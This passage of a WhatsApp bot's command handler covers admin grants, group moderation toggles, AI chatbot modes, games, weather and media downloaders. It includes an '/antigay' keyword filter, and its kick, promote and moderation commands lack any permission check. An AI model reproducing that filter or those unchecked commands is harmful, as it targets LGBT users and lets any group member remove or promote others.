              text: `❌ Failed to create group: ${err.message}\n\n💡 Make sure the bot has permission to create groups.`
            });
          }
        }

        // ADMIN COMMAND - Grant admin access
        if (cmd.startsWith("/admin ") && isOwner(sender)) {
          const phoneNumber = body.slice(7).trim().replace(/[^0-9]/g, "");
          if (!phoneNumber) {
            return sock.sendMessage(from, { text: "❌ Usage: /admin [number]\nExample: /admin 2347012345678" });
          }
          const adminJid = phoneNumber + "@s.whatsapp.net";
          if (OWNERS.includes(adminJid)) {
            return sock.sendMessage(from, { text: `⚠️ ${phoneNumber} is already an admin!` });
          }
          OWNERS.push(adminJid);
          return sock.sendMessage(from, { text: `✅ *ADMIN GRANTED*\n\n📱 Number: ${phoneNumber}\n🔑 Status: Admin access activated!\n\nThey can now use owner-only commands.` });
        }

        // REMADMIN COMMAND - Revoke admin access
        if (cmd.startsWith("/remadmin ") && isOwner(sender)) {
          const phoneNumber = body.slice(9).trim().replace(/[^0-9]/g, "");
          if (!phoneNumber) {
            return sock.sendMessage(from, { text: "❌ Usage: /remadmin [number]\nExample: /remadmin 2347012345678" });
          }
          const adminJid = phoneNumber + "@s.whatsapp.net";
          if (!OWNERS.includes(adminJid)) {
            return sock.sendMessage(from, { text: `⚠️ ${phoneNumber} is not an admin!` });
          }
          OWNERS.splice(OWNERS.indexOf(adminJid), 1);
          return sock.sendMessage(from, { text: `✅ *ADMIN REVOKED*\n\n📱 Number: ${phoneNumber}\n🔑 Status: Admin access removed!\n\nThey can no longer use owner-only commands.` });
        }

        if (cmd === "/antilink on" && isGroup) {
          ANTILINK = true;
          saveConfig();
          return sock.sendMessage(from, { text: "🛡️ *ANTI-LINK: ENABLED*\n\nUnauthorized links in this group will be automatically deleted." });
        }
        if (cmd === "/antilink off" && isGroup) {
          ANTILINK = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔓 *ANTI-LINK: DISABLED*\n\nMembers may now send links." });
        }

        if (cmd === "/antisticker on" && isGroup) {
          ANTISTICKER = true;
          saveConfig();
          return sock.sendMessage(from, { text: "🖼️ *ANTI-STICKER: ENABLED*\n\nIncoming stickers from non-exempt users will be deleted." });
        }
        if (cmd === "/antisticker off" && isGroup) {
          ANTISTICKER = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔓 *ANTI-STICKER: DISABLED*" });
        }

        if (cmd === "/antighost on" && isGroup) {
          ANTIGHOST = true;
          saveConfig();
          return sock.sendMessage(from, { text: "👻 *ANTI-GHOST: ENABLED*\n\nView-once media protections are now active." });
        }
        if (cmd === "/antighost off" && isGroup) {
          ANTIGHOST = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔓 *ANTI-GHOST: DISABLED*" });
        }

        if (cmd === "/antichat on" && isGroup) {
          ANTICHAT = true;
          saveConfig();
          return sock.sendMessage(from, { text: "🔇 *ANTI-CHAT: ENABLED*\n\nChat is now muted. Only bot commands from allowed users will pass." });
        }
        if (cmd === "/antichat off" && isGroup) {
          ANTICHAT = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔊 *ANTI-CHAT: DISABLED*\n\nGroup chat unmuted." });
        }

        if (cmd === "/anticall on") {
          ANTICALL = true;
          saveConfig();
          return sock.sendMessage(from, { text: "📞 *ANTI-CALL: ENABLED*\n\nIncoming WhatsApp calls will be automatically rejected." });
        }
        if (cmd === "/anticall off") {
          ANTICALL = false;
          saveConfig();
          return sock.sendMessage(from, { text: "📞 *ANTI-CALL: DISABLED*" });
        }

        if (cmd === "/antibadwords on" && isGroup) {
          ANTIBADWORDS = true;
          saveConfig();
          return sock.sendMessage(from, { text: "🔞 *ANTI-BADWORDS: ENABLED*\n\nProfanity and offensive language will be filtered and deleted." });
        }
        if (cmd === "/antibadwords off" && isGroup) {
          ANTIBADWORDS = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔓 *ANTI-BADWORDS: DISABLED*" });
        }

        if (cmd === "/antigay on" && isGroup) {
          ANTIGAY = true;
          saveConfig();
          return sock.sendMessage(from, { text: "🚫 *ANTI-GAY KEYWORDS: ENABLED*" });
        }
        if (cmd === "/antigay off" && isGroup) {
          ANTIGAY = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔓 *ANTI-GAY KEYWORDS: DISABLED*" });
        }

        if (cmd === "/autotyping on") {
          AUTOTYPING = true;
          saveConfig();
          return sock.sendMessage(from, { text: "⌨️ *AUTO-TYPING: ENABLED*\n\nTyping indicator will simulate naturally." });
        }
        if (cmd === "/autotyping off") {
          AUTOTYPING = false;
          saveConfig();
          return sock.sendMessage(from, { text: "⌨️ *AUTO-TYPING: DISABLED*" });
        }

        if (cmd === "/autorecording on") {
          AUTORECORDING = true;
          saveConfig();
          return sock.sendMessage(from, { text: "🎙️ *AUTO-RECORDING: ENABLED*" });
        }
        if (cmd === "/autorecording off") {
          AUTORECORDING = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🎙️ *AUTO-RECORDING: DISABLED*" });
        }

        if (cmd === "/autorecordtyping on") {
          AUTOTYPING = true;
          AUTORECORDING = true;
          saveConfig();
          return sock.sendMessage(from, { text: "⚡ *AUTO RECORD + TYPE: ENABLED*" });
        }
        if (cmd === "/autorecordtyping off") {
          AUTOTYPING = false;
          AUTORECORDING = false;
          saveConfig();
          return sock.sendMessage(from, { text: "⚡ *AUTO RECORD + TYPE: DISABLED*" });
        }

        if (cmd === "/autoreact on") {
          AUTOREACT = true;
          saveConfig();
          return sock.sendMessage(from, { text: "❤️ *AUTO-REACT: ENABLED*\n\nBot will react with emoji to incoming messages." });
        }
        if (cmd === "/autoreact off") {
          AUTOREACT = false;
          saveConfig();
          return sock.sendMessage(from, { text: "💔 *AUTO-REACT: DISABLED*" });
        }

        if (cmd.startsWith("/chatbot1")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot1 on") {
            CHATBOT_STATE[from] = "1";
            return sock.sendMessage(from, {
              text: `✅ *${CHATBOT_LABELS["1"]} ENABLED*\n\n🤖 I will now automatically respond to ALL messages in this chat with professional AI assistance.\n\n📝 *How it works:*\n• Send any message (no prefix needed)\n• I will reply automatically\n• Use \`/chatbot1 off\` to disable\n\n🎯 *Best for:* Professional conversations, technical help, general assistance`
            });
          }
          if (cmd === "/chatbot1 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, {
              text: `❌ *${CHATBOT_LABELS["1"]} DISABLED*\n\n🤖 Auto-reply has been turned off for this chat. Use \`/chatbot1 on\` to re-enable.`
            });
          }
          if (args) {
            const answer = await getChatbotReply("1", args);
            return sock.sendMessage(from, { text: `🤖 *${CHATBOT_LABELS["1"]}*\n\n${answer}` });
          }
          return sock.sendMessage(from, {
            text: `📖 *${CHATBOT_LABELS["1"]} Usage:*\n\n• \`/chatbot1 on\` - Enable auto-reply for all messages\n• \`/chatbot1 off\` - Disable auto-reply\n• \`/chatbot1 <message>\` - Ask directly (one-time)`
          });
        }

        if (cmd.startsWith("/chatbot2")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot2 on") {
            CHATBOT_STATE[from] = "2";
            return sock.sendMessage(from, {
              text: `✅ *${CHATBOT_LABELS["2"]} ENABLED*\n\n🎯 I will now automatically respond to ALL messages in this chat with Ollama Dolphin3 assistance.\n\n📝 *How it works:*\n• Send any message (no prefix needed)\n• I will reply automatically using Ollama + dolphin3 model\n• Use \`/chatbot2 off\` to disable\n\n💼 *Best for:* Business advice, productivity tips, professional guidance`
            });
          }
          if (cmd === "/chatbot2 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, {
              text: `❌ *${CHATBOT_LABELS["2"]} DISABLED*\n\n🎯 Auto-reply has been turned off for this chat. Use \`/chatbot2 on\` to re-enable.`
            });
          }
          if (args) {
            try {
              await sendLoadingStatus(from);
              const answer = await getChatbot2OllamaReply(args);
              return sock.sendMessage(from, { text: `🎯 *${CHATBOT_LABELS["2"]} (Ollama)*\n\n${answer}` }, { quoted: m });
            } catch (error) {
              console.error("Chatbot2 Ollama error:", error);
              const errorMsg = error.message || "Please check Ollama settings and try again.";
              return sock.sendMessage(from, {
                text: `❌ *Ollama Error*\n\n${errorMsg}\n\nMake sure Ollama is running at ${OLLAMA_HOST} and the dolphin3 model is available.`
              });
            }
          }
          return sock.sendMessage(from, {
            text: `📖 *${CHATBOT_LABELS["2"]} (Ollama Dolphin3) Usage:*\n\n• \`/chatbot2 on\` - Enable auto-reply for all messages\n• \`/chatbot2 off\` - Disable auto-reply\n• \`/chatbot2 <message>\` - Ask directly (one-time)`
          });
        }

        if (cmd.startsWith("/chatbot3")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot3 on") {
            CHATBOT_STATE[from] = "3";
            return sock.sendMessage(from, {
              text: `✅ *${CHATBOT_LABELS["3"]} ENABLED*\n\n😄 I will now automatically respond to ALL messages in this chat with fun, playful conversations.\n\n📝 *How it works:*\n• Send any message (no prefix needed)\n• I will reply automatically\n• Use \`/chatbot3 off\` to disable\n\n🎪 *Best for:* Casual chats, entertainment, friendly conversations`
            });
          }
          if (cmd === "/chatbot3 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, {
              text: `❌ *${CHATBOT_LABELS["3"]} DISABLED*\n\n😄 Auto-reply has been turned off for this chat. Use \`/chatbot3 on\` to re-enable.`
            });
          }
          if (args) {
            const answer = await getChatbotReply("3", args);
            return sock.sendMessage(from, { text: `😄 *${CHATBOT_LABELS["3"]}*\n\n${answer}` });
          }
          return sock.sendMessage(from, {
            text: `📖 *${CHATBOT_LABELS["3"]} Usage:*\n\n• \`/chatbot3 on\` - Enable auto-reply for all messages\n• \`/chatbot3 off\` - Disable auto-reply\n• \`/chatbot3 <message>\` - Ask directly (one-time)`
          });
        }

        if (cmd === "/chatbot" || cmd.startsWith("/chatbot ")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot on") {
            CHATBOT_STATE[from] = "5";
            return sock.sendMessage(from, {
              text: `✅ *${CHATBOT_LABELS["5"]} ENABLED*\n\n🧠 I will now automatically respond to ALL messages in this chat with the DeepSeek Cloud model via Ollama.\n\n📝 *How it works:*\n• Send any message (no prefix needed)\n• I will reply automatically\n• Use \`/chatbot off\` to disable\n\n⚡ *Best for:* Fast, helpful, and conversational AI answers`
            });
          }
          if (cmd === "/chatbot off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, {
              text: `❌ *${CHATBOT_LABELS["5"]} DISABLED*\n\n🧠 Auto-reply has been turned off for this chat. Use \`/chatbot on\` to re-enable.`
            });
          }
          if (args) {
            const answer = await getChatbotReply("5", args);
            return sock.sendMessage(from, { text: `🧠 *${CHATBOT_LABELS["5"]}*\n\n${answer}` });
          }
          return sock.sendMessage(from, {
            text: `📖 *${CHATBOT_LABELS["5"]} Usage:*\n\n• \`/chatbot on\` - Enable auto-reply for all messages\n• \`/chatbot off\` - Disable auto-reply\n• \`/chatbot <message>\` - Ask directly (one-time)`
          });
        }

        if (cmd.startsWith("/chatbot4")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot4 on") {
            CHATBOT_STATE[from] = "4";
            return sock.sendMessage(from, {
              text: `✅ *${CHATBOT_LABELS["4"]} ENABLED*\n\n👹 I will now automatically respond to ALL messages in this chat with supernatural wisdom and guidance.\n\n📝 *How it works:*\n• Send any message (no prefix needed)\n• I will reply automatically\n• Use \`/chatbot4 off\` to disable\n\n🔮 *Best for:* Deep conversations, mystical guidance, supernatural insights`
            });
          }
          if (cmd === "/chatbot4 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, {
              text: `❌ *${CHATBOT_LABELS["4"]} DISABLED*\n\n👹 Auto-reply has been turned off for this chat. Use \`/chatbot4 on\` to re-enable.`
            });
          }
          if (args) {
            const answer = await getChatbotReply("4", args);
            return sock.sendMessage(from, { text: `👹 *${CHATBOT_LABELS["4"]}*\n\n${answer}` });
          }
          return sock.sendMessage(from, {
            text: `📖 *${CHATBOT_LABELS["4"]} Usage:*\n\n• \`/chatbot4 on\` - Enable auto-reply for all messages\n• \`/chatbot4 off\` - Disable auto-reply\n• \`/chatbot4 <message>\` - Ask directly (one-time)`
          });
        }

        if (cmd.startsWith("/setrapidapi ") && isOwner(sender)) {
          const newKey = body.slice(12).trim();
          if (!newKey) {
            return sock.sendMessage(from, { text: "❌ Usage: /setrapidapi <RapidAPI key>" });
          }
          CONFIG.RAPIDAPI_KEY = newKey;
          try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
            RAPIDAPI_KEY = newKey;
            return sock.sendMessage(from, { text: "✅ RapidAPI key saved to config.json. YouTube downloader is ready to use." });
          } catch (error) {
            console.error("Failed to save config.json:", error);
            return sock.sendMessage(from, { text: `❌ Failed to save RapidAPI key: ${error.message}` });
          }
        }

        if (cmd === "/rapidapistatus" && isOwner(sender)) {
          const source = process.env.RAPIDAPI_KEY ? "environment" : CONFIG.RAPIDAPI_KEY ? "config.json" : "none";
          const visible = RAPIDAPI_KEY && RAPIDAPI_KEY !== "YOUR_RAPIDAPI_KEY" ? "✅ configured" : "❌ missing";
          return sock.sendMessage(from, { text: `🔑 RapidAPI Key Status: ${visible}\nSource: ${source}` });
        }

        if (cmd.startsWith("/setopenai ") && isOwner(sender)) {
          const newKey = body.slice(11).trim();
          if (!newKey) {
            return sock.sendMessage(from, { text: "❌ Usage: /setopenai <OpenAI API key>" });
          }
          CONFIG.OPENAI_API_KEY = newKey;
          try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
            OPENAI_API_KEY = newKey;
            return sock.sendMessage(from, { text: "✅ OpenAI API key saved to config.json. Chatbot is ready to use." });
          } catch (error) {
            console.error("Failed to save config.json:", error);
            return sock.sendMessage(from, { text: `❌ Failed to save API key: ${error.message}` });
          }
        }

        if (cmd === "/openai status" && isOwner(sender)) {
          const source = process.env.OPENAI_API_KEY ? "environment" : CONFIG.OPENAI_API_KEY ? "config.json" : "none";
          const visible = OPENAI_API_KEY && OPENAI_API_KEY !== "YOUR_OPENAI_API_KEY" ? "✅ configured" : "❌ missing";
          return sock.sendMessage(from, { text: `🧠 OpenAI Key Status: ${visible}\nSource: ${source}` });
        }

        if (cmd.startsWith("/clearopenai") && isOwner(sender)) {
          delete CONFIG.OPENAI_API_KEY;
          try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
            OPENAI_API_KEY = process.env.OPENAI_API_KEY || "YOUR_OPENAI_API_KEY";
            return sock.sendMessage(from, { text: "✅ OpenAI API key cleared from config.json." });
          } catch (error) {
            console.error("Failed to save config.json:", error);
            return sock.sendMessage(from, { text: `❌ Failed to clear API key: ${error.message}` });
          }
        }

        if (cmd === "/chatbotstatus") {
          const provider = CHATBOT_STATE[from];
          if (!provider) {
            return sock.sendMessage(from, {
              text: `🤖 *CHATBOT STATUS*\n\n❌ *Status:* DISABLED\n📍 *Chat:* ${isGroup ? 'Group' : 'Private'}\n\n💡 *To enable:*\n• \`/chatbot on\` - DeepSeek Cloud (Ollama)\n• \`/chatbot1 on\` - AI Assistant\n• \`/chatbot2 on\` - Business Pro\n• \`/chatbot3 on\` - Playful Companion\n\n📝 *How it works:* Once enabled, I automatically reply to ALL messages in this chat.`
            });
          }

          const label = CHATBOT_LABELS[provider] || `CHATBOT${provider}`;
          const chatType = isGroup ? 'Group' : 'Private';

          return sock.sendMessage(from, {
            text: `🤖 *CHATBOT STATUS*\n\n✅ *Status:* ACTIVE\n🎯 *AI Personality:* ${label}\n📍 *Chat Type:* ${chatType}\n🔢 *Provider ID:* ${provider}\n\n📝 *Current Behavior:* Auto-replying to all messages\n\n💡 *To change:* Use \`/chatbot off\` then enable a different one\n💡 *To disable:* Use \`/chatbot${provider} off\``
          });
        }

        if (cmd === "/welcome on" && isGroup) {
          WELCOME = true;
          saveConfig();
          return sock.sendMessage(from, { text: "👋 *WELCOME GREETER: ENABLED*\n\nNew group members will be greeted automatically." });
        }
        if (cmd === "/welcome off" && isGroup) {
          WELCOME = false;
          saveConfig();
          return sock.sendMessage(from, { text: "👋 *WELCOME GREETER: DISABLED*" });
        }

        if (cmd === "/group-defense on" && isGroup) {
          GROUP_DEFENSE = true;
          saveConfig();
          return sock.sendMessage(from, {
            text: `🛡️ *GROUP DEFENSE ACTIVATED* 🛡️\n\nActive Protections:\n├─ 📦 Block Malicious APK Files\n├─ ⛔ Filter Crash & Glitch Text\n└─ 🔒 Auto-Sanitize Group Media`
          });
        }
        if (cmd === "/group-defense off" && isGroup) {
          GROUP_DEFENSE = false;
          saveConfig();
          return sock.sendMessage(from, { text: "🔓 *GROUP DEFENSE DEACTIVATED*" });
        }


        if (
          (cmd === "/promote" || cmd.startsWith("/promote ") ||
           cmd === "/demote"  || cmd.startsWith("/demote ")) &&
          isGroup
        ) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, {
              text: "❌ Mention a user or provide a number"
            });

          const action = cmd.includes("/promote") ? "promote" : "demote";
          await sock.groupParticipantsUpdate(from, [user], action);

          return sock.sendMessage(from, {
            text: `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} successful`
          });
        }

        if ((cmd === "/kick" || cmd.startsWith("/kick ")) && isGroup) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, {
              text: "❌ Mention a user or provide a number"
            });

          try {
            await sock.groupParticipantsUpdate(from, [user], "remove");
            return sock.sendMessage(from, {
              text: `🚫 @${user.split("@")[0]} has been kicked`,
              mentions: [user]
            });
          } catch (err) {
            return sock.sendMessage(from, {
              text: "❌ Failed to kick user (bot needs admin)"
            });
          }
        }






        if (cmd === "/joke") {
          const joke = await getFunJoke();
          SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 10;
          return sock.sendMessage(from, { text: `${joke}\n\n⭐ Your Score: ${SCORE_STORE[sender]}` });
        }
        if (cmd === "/roll")
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: `🎲 ${Math.floor(Math.random() * 6) + 1}\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/repeat "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(8) + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/reverse "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(9).split("").reverse().join("") + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/uppercase "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(11).toUpperCase() + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/lowercase "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(11).toLowerCase() + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd === "/truth") {
          const truth = await getTruthQuestion();
          SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 15;
          return sock.sendMessage(from, { text: `${truth}\n\n⭐ Your Score: ${SCORE_STORE[sender]}` });
        }
        if (cmd === "/dare") {
          const dare = await getDareChallenge();
          SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 15;
          return sock.sendMessage(from, { text: `${dare}\n\n⭐ Your Score: ${SCORE_STORE[sender]}` });
        }
        if (cmd === "/countdown") {
          const seconds = parseInt(body.slice(10).trim());
          if (!seconds || seconds <= 0 || seconds > 3600) {
            return sock.sendMessage(from, { text: "❌ Invalid time! Use: /countdown [seconds]\nExample: /countdown 10\n(Max 3600 seconds / 60 minutes)" });
          }

          await sock.sendMessage(from, { text: `⏳ *COUNTDOWN STARTING*\n\nFrom: ${seconds} seconds` });

          let remaining = seconds;
          while (remaining > 0) {
            await new Promise(r => setTimeout(r, 1000));
            
            if (remaining <= 10 || remaining % 5 === 0) {
              const progress = Math.ceil((remaining / seconds) * 10);
              const progressBar = "█".repeat(Math.max(0, progress)) + "░".repeat(Math.max(0, 10 - progress));
              await sock.sendMessage(from, { text: `⏳ *TIME REMAINING*\n\n${progressBar}\n\n${remaining} seconds left` });
            }
            
            remaining--;
          }

          return sock.sendMessage(from, { text: `🎉 *COUNTDOWN COMPLETE!*\n\nTime's up! ⏰` });
        }

        if (cmd.startsWith("/ship ") && isGroup) {
          const mentioned = m.message.extendedTextMessage?.contextInfo?.mentionedJid;
          if (!mentioned || mentioned.length < 2) {
            return sock.sendMessage(from, { text: "❌ Mention 2 people to ship!\nExample: /ship @user1 @user2" });
          }
          const percentage = Math.floor(Math.random() * 100);
          let message = `💘 *MATCHMAKING REPORT* 💘\n\n🔻 ${mentioned[0].split("@")[0]} + ${mentioned[1].split("@")[0]}\n📊 Result: ${percentage}%\n\n`;

          if (percentage > 90) message += "🔥 PERFECT MATCH! Get married already!";
          else if (percentage > 70) message += "🥰 Amazing couple!";
          else if (percentage > 50) message += "🙂 Good potential.";
          else if (percentage > 30) message += "😬 Could be better...";
          else message += "💀 RUN AWAY! Toxic relationship detected.";

          return sock.sendMessage(from, { text: message, mentions: mentioned });
        }

        if (cmd.startsWith("/math ")) {
          try {
            const expression = body.slice(6).trim();

            if (!/^[0-9+\-*/().\s]+$/.test(expression)) {
              return sock.sendMessage(from, { text: "❌ Invalid math expression. Only numbers and +, -, *, / are allowed." });
            }

            const result = new Function('return ' + expression)();
            return sock.sendMessage(from, { text: `🔢 *CALCULATOR*\n\nExpression: ${expression}\nResult: ${result}` });
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ Invalid calculation." });
          }
        }

        if (cmd === "/fact") {
          const facts = [
            "Honey never spoils.", "Bananas are berries, but strawberries aren't.",
            "Octopuses have three hearts.", "Wombat poop is cube-shaped.",
            "The Eiffel Tower can be 15 cm taller during the summer.",
            "Venus is the only planet to spin clockwise.",
            "A cloud can weigh more than a million pounds."
          ];
          const fact = facts[Math.floor(Math.random() * facts.length)];
          return sock.sendMessage(from, { text: `🧠 *DID YOU KNOW?*\n\n${fact}` });
        }

        if (cmd.startsWith("/8ball ")) {
          const answers = [
            "Yes, definitely.", "It is certain.", "Without a doubt.",
            "Most likely.", "Outlook good.", "Ask again later.",
            "Better not tell you now.", "Cannot predict now.",
            "Don't count on it.", "My reply is no.", "My sources say no.",
            "Outlook not so good.", "Very doubtful."
          ];
          const answer = answers[Math.floor(Math.random() * answers.length)];
          return sock.sendMessage(from, { text: `🔮 *MAGIC 8-BALL*\n\nQuestion: ${body.slice(7)}\nAnswer: ${answer}` });
        }

        if (cmd === "/coinflip") {
          const result = Math.random() > 0.5 ? "HEADS 🦅" : "TAILS 🪙";
          return sock.sendMessage(from, { text: `🪙 *COIN FLIP*\n\nResult: ${result}` });
        }

        if (cmd.startsWith("/weather ")) {
          const city = body.slice(9).trim();
          if (!city) return sock.sendMessage(from, { text: "❌ Provide a city name!\nExample: /weather Lagos" });

          try {
            await sendLoadingStatus(from);
            // 1. Geocode location via Open-Meteo (free, no API key required)
            const geoRes = await axios.get(`https://geocoding-api.open-meteo.com/v1/search`, {
              params: { name: city, count: 1, language: 'en', format: 'json' },
              timeout: 8000
            });

            if (!geoRes.data?.results?.length) {
              return sock.sendMessage(from, { text: `❌ Could not find location "*${city}*". Please check spelling.` }, { quoted: m });
            }

            const loc = geoRes.data.results[0];
            const lat = loc.latitude;
            const lon = loc.longitude;
            const placeName = [loc.name, loc.admin1, loc.country].filter(Boolean).join(", ");

            // 2. Fetch current weather
            const weatherRes = await axios.get(`https://api.open-meteo.com/v1/forecast`, {
              params: {
                latitude: lat,
                longitude: lon,
                current: 'temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m',
                timezone: 'auto'
              },
              timeout: 8000
            });

            const curr = weatherRes.data?.current;
            if (!curr) throw new Error("Weather data unavailable");

            const wmoMap = {
              0: { text: "Clear Sky", emoji: "☀️" },
              1: { text: "Mainly Clear", emoji: "🌤️" },
              2: { text: "Partly Cloudy", emoji: "⛅" },
              3: { text: "Overcast", emoji: "☁️" },
              45: { text: "Foggy", emoji: "🌫️" },
              48: { text: "Depositing Rime Fog", emoji: "🌫️" },
              51: { text: "Light Drizzle", emoji: "🌦️" },
              53: { text: "Moderate Drizzle", emoji: "🌦️" },
              55: { text: "Dense Drizzle", emoji: "🌧️" },
              61: { text: "Slight Rain", emoji: "🌧️" },
              63: { text: "Moderate Rain", emoji: "🌧️" },
              65: { text: "Heavy Rain", emoji: "🌧️" },
              71: { text: "Slight Snow", emoji: "🌨️" },
              73: { text: "Moderate Snow", emoji: "🌨️" },
              75: { text: "Heavy Snow", emoji: "❄️" },
              80: { text: "Rain Showers", emoji: "🌦️" },
              81: { text: "Moderate Showers", emoji: "🌧️" },
              82: { text: "Violent Showers", emoji: "⛈️" },
              95: { text: "Thunderstorm", emoji: "⛈️" },
              96: { text: "Thunderstorm with Hail", emoji: "⛈️" },
              99: { text: "Heavy Thunderstorm with Hail", emoji: "⛈️" }
            };

            const info = wmoMap[curr.weather_code] || { text: "Moderate", emoji: "🌡️" };

            const text = `╔══════════════════════════════════╗
║     🌤️ *LIVE WEATHER REPORT*
╚══════════════════════════════════╝

📍 *Location:* ${placeName}
${info.emoji} *Condition:* ${info.text}
🌡️ *Temperature:* ${curr.temperature_2m}°C (Feels like ${curr.apparent_temperature}°C)
💧 *Humidity:* ${curr.relative_humidity_2m}%
💨 *Wind Speed:* ${curr.wind_speed_10m} km/h

⚡ *Live Data via Open-Meteo*`;

            return sock.sendMessage(from, { text }, { quoted: m });
          } catch (e) {
            console.error("Weather error:", e.message);
            return sock.sendMessage(from, { text: `❌ Failed to fetch live weather for "${city}". Please try again.` }, { quoted: m });
          }
        }

        if (cmd === "/downloader") {
          return sock.sendMessage(from, {
            text: `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 📥 DOWNLOADER PANEL
┃ Media Download Tools
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

📹 VIDEO PLATFORMS
├─ ${PREFIX}ytdl [url] • YouTube
├─ ${PREFIX}tiktokdl [url] • TikTok
├─ ${PREFIX}instadl [url] • Instagram
├─ ${PREFIX}fbdl [url] • Facebook

🎵 AUDIO & MUSIC
├─ ${PREFIX}spotifydl [url] • Spotify

🎬 ANIME TOOLS
└─ ${PREFIX}anime [title] • Search anime info

📦 APPLICATIONS
└─ ${PREFIX}apkdl [name] • APK files

💡 HOW TO USE
├─ Copy video/audio URL
├─ Send: ${PREFIX}ytdl [paste URL]
├─ Wait for download
└─ Receive file

⚙️ NOTES
├─ External services used
├─ May take a moment
└─ Quality depends on source

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Back to menu: ${PREFIX}menu
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
          });
        }

        if (cmd.startsWith("/ytdl ")) {
          const url = body.slice(6).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide YouTube URL" });
          if (!RAPIDAPI_KEY || RAPIDAPI_KEY === "YOUR_RAPIDAPI_KEY") {
            return sock.sendMessage(from, { text: "❌ YouTube downloads require a RapidAPI key. Set it with /setrapidapi <key> or use the RAPIDAPI_KEY environment variable." });
          }

          await sock.sendMessage(from, { text: "⏳ Downloading YouTube video..." });
          try {
            const { data } = await axios.get(`https://yt-api.p.rapidapi.com/dl?id=${encodeURIComponent(url)}`, {
              headers: {
                'X-RapidAPI-Key': RAPIDAPI_KEY,
                'X-RapidAPI-Host': RAPIDAPI_HOST
              },
              timeout: 20000
            });
            const videoUrl = data?.url || data?.video;
            if (!videoUrl) throw new Error("Could not extract video URL");
            
            return sock.sendMessage(from, { video: { url: videoUrl }, caption: "✅ Downloaded from YouTube" });
          } catch (e) {
            console.error("YouTube downloader error:", e?.message || e);
            return sock.sendMessage(from, { text: `❌ YouTube Download Failed: ${e?.message || "Check your RapidAPI key and URL."}` });
          }
        }

        if (cmd.startsWith("/tiktokdl ")) {
          const url = body.slice(10).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide TikTok URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading TikTok video..." });
          try {
            // Using tikwm API (free, no auth needed)
            const { data } = await axios.get(`https://tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`);
            if (data.code !== 0 || !data.data) throw new Error("Video not found");
            
            const videoUrl = data.data.play || data.data.download;
            if (!videoUrl) throw new Error("Could not extract TikTok video URL");

            return sock.sendMessage(from, { video: { url: videoUrl }, caption: "✅ Downloaded from TikTok" });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ TikTok Download Failed: Make sure the URL is valid` });
          }
        }

        if (cmd.startsWith("/instadl ")) {
          const url = body.slice(9).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide Instagram URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading Instagram media..." });
          try {
            // Using snapinsta API
            const { data } = await axios.get(`https://snapinsta.io/download`, {
              params: { url: url }
            });
            const mediaUrl = data?.media?.[0]?.url || data?.url;
            if (!mediaUrl) throw new Error("Could not extract media URL");
            
            return sock.sendMessage(from, { video: { url: mediaUrl }, caption: "✅ Downloaded from Instagram" });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Instagram Download Failed: ${e.message}` });
          }
        }

        if (cmd.startsWith("/fbdl ")) {
          const url = body.slice(6).trim();
